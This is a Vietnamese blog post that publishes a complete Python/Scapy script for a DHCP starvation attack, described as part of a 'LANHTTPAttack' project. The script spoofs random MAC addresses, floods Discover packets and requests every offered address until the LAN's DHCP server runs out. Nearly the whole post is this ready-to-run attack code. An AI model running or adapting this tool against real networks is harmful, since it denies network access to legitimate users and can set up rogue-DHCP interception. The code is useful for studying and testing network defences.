---
title:  "Flood DHCP Server với Python và Scapy"
date:   2018-08-18 14:59:00
categories: [Python]
tags: [Python, Scapy, DHCP]
---

Code này mình viết vừa để học `Python 3` vừa là một phần của project `LANHTTPAttack`. Tuy nhiên project này được viết bằng `Python 2.7`
Hoạt động tốt nhất với `scapy 2.3.2`
Code còn rất nhiều lỗi và đặc biệt là thiếu chức năng release IP của các neighbors. Cái này mình sẽ cập nhật sau vì hiện tại `LANHTTPAttack` chưa cần fix mấy lỗi này lắm.

Cách hoạt động của chương trình:
- Khởi tạo một thread Sniffer đọc tất cả các DHCP Response.
- Khi sniffer đã chạy, chương trình liên tục tạo gói các DHCP Discover và gửi ra toàn mạng với tốc độ 10 packet/s.
- Khi sniffer nhận được gói DHCP Offer, nó sẽ tạo gói DHCP Request gửi lại cho DHCP Server.
- Trong quá trình tạo DHCP Request, thời gian cuối cùng nhận được gói Offer sẽ được ghi nhận. Nếu 10 giây sau mà sniffer không nhận được Offer nào nữa - tức là đã cạn kiệt địa chỉ IP, kết thúc quá trình gửi gói Discovery.

Github: [https://github.com/daoxuanhung/DHCPExhauster](https://github.com/daoxuanhung/DHCPExhauster)

``` python
#/usr/bin/python

# Dao Xuan Hung
# 16/08/2018 13:25

from scapy.all import *
import threading, time, datetime, socket, binascii

def randomMAC():
    # from DHCPPig
    mac = [ 0xDE, 0xAD,
        random.randint(0x00, 0x29),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def unpackMAC(binmac):
    # from DHCPPig
    mac = binascii.hexlify(binmac)[0:12]
    blocks = [mac[x:x+2] for x in xrange(0, len(mac), 2)]
    return ':'.join(blocks)

def seconds_diff(dt2, dt1):
    # from https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-36.php
    timedelta = dt2 - dt1
    return timedelta.days * 24 * 3600 + timedelta.seconds

def randomHostname(length):
    # and this from me :))
    hostname = ''
    for i in range (length):
        num = random.randint(97, 122)
        hostname += chr(num)
    return hostname



class DHCPSniffer(threading.Thread):
    def __init__(self, iface):
        super(DHCPSniffer, self).__init__()
        self.iface = iface
        self.socket = None
        self.daemon = True
        self.stop_sniffer = threading.Event()

    def run(self):
        filter_options = 'udp and src port 67 and dst port 68'

        self.socket = conf.L2listen(
                                    type = ETH_P_ALL,
                                    iface = self.iface,
                                    filter = filter_options
                                    )
        
        sniff(opened_socket = self.socket, prn=self.ProcessPacket, stop_filter=self.should_stop_sniffer)

    def should_stop_sniffer(self, packet):
        return self.stop_sniffer.isSet()

    def join(self, timeout = None):
        self.stop_sniffer.set()
        self.socket.close() # this socket must be closed to stop sniffer
        super(DHCPSniffer, self).join(timeout)

    def ProcessPacket(self, packet):
        if (DHCP in packet):
            if (packet[DHCP] and packet[DHCP].options[0][1] == 2): # if DHCP Offer
                ip = packet[BOOTP].yiaddr
                serverip = packet[BOOTP].siaddr
                tranid = packet[BOOTP].xid
                srcmac = unpackMAC(packet[BOOTP].chaddr)

                # create DHCP request
                request = DHCPRequestClient(self.iface, srcmac, ip, serverip, tranid)
                request.run()
                del request

            if (packet[DHCP] and packet[DHCP].options[0][1] == 5): # if DHCP ACK
                ip = packet[BOOTP].yiaddr
                print "Got IP address: " + ip


class DHCPRequestClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, iface, srcmac, ip, serverip, tranid):
        self.iface  = iface
        self.srcmac = srcmac
        self.ip     = ip
        self.serverip = serverip
        self.tranid = tranid

    def run(self):
        global last_response_time
        # when this method run, it means DHCP server has just offered us new IP address
        last_response_time = datetime.datetime.now()
        self.Request()

    def Request(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = self.tranid, # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'request'),
                        ('param_req_list', chr(1), chr(3), chr(6), 
                        chr(15), chr(31), chr(33), chr(43), chr(44), 
                        chr(46), chr(47), chr(119), chr(121), chr(249), 
                        chr(252)),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('server_id', self.serverip),
                        ('requested_addr', self.ip),
                        ('end')]
        dhcprequest= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcprequest

        sendp(packet, iface=self.iface, verbose=False)



class DHCPDiscoverClient():
    broadcast_MAC = 'ff:ff:ff:ff:ff:ff'
    broadcast_IP = '255.255.255.255'

    def __init__(self, srcmac, iface):
        self.srcmac = srcmac
        self.hostname = randomHostname(random.randint(6, 10))
        self.iface = iface

    def run(self):
        self.Discover()

    def Discover(self):
        frame       = Ether(src = self.srcmac, dst = self.broadcast_MAC)
        ippacket    = IP(src = '0.0.0.0', dst = self.broadcast_IP)
        udppacket   = UDP(sport = 68, dport = 67)
        bootp       = BOOTP(op = 'BOOTREQUEST',
                            xid = random.randint(0x1000, 0x5000), # Transaction ID
                            flags = 0,   # Unicast
                            chaddr = mac2str(self.srcmac))

        myoptions   = [ ('message-type', 'discover'),
                        ('param_req_list', chr(1), chr(3), chr(6), 
                        chr(15), chr(31), chr(33), chr(43), chr(44), 
                        chr(46), chr(47), chr(119), chr(121), chr(249), 
                        chr(252)),
                        ('client_id', chr(1), mac2str(self.srcmac)), # Ethernet
                        ('hostname', self.hostname),
                        ('end') ]
        dhcpdiscover= DHCP(options = myoptions)

        packet = frame/ippacket/udppacket/bootp/dhcpdiscover

        sendp(packet, iface=self.iface, verbose=False)


def floodDHCPServer(iface):
    try:
        # Send DHCPDiscover continually
        # Sniffer receives OFFER packets, and create a DHCPRequest to receive ACK

        sniffer = DHCPSniffer(iface)
        sniffer.start()
        while(True):
            # send DHCP Discover
            discover = DHCPDiscoverClient(randomMAC(), iface)
            discover.run()
            del discover

            time.sleep(0.05)

            current_time = datetime.datetime.now()
            # if we hadn't received any offer in 10 seconds, it means DHCP server had been exhausted
            if (seconds_diff(current_time, last_response_time) > 10):
                # stop sniffer
                sniffer.join(2)
                del sniffer
                break
    except KeyboardInterrupt:
        sniffer.join(2)
        del sniffer


def main():
    floodDHCPServer('eth0')
    print "Done"

# variables
last_response_time = datetime.datetime.now()

if __name__ == '__main__':
    main()
exit()
```

